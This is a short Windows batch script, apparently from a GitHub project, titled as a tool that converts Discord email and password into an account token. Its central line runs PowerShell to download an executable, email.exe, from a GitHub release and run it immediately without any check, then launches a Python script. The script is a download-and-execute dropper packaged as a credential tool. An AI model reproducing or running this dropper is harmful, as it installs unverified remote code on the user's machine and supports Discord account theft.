@echo off

title Email + Passwords = Token
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/IWcommunityFR
echo.
cd dist
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Discord-Email-Password-token/releases/download/Discord-Email-Password-token/email.exe';$file='email.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cd ..
start output\data\main.py
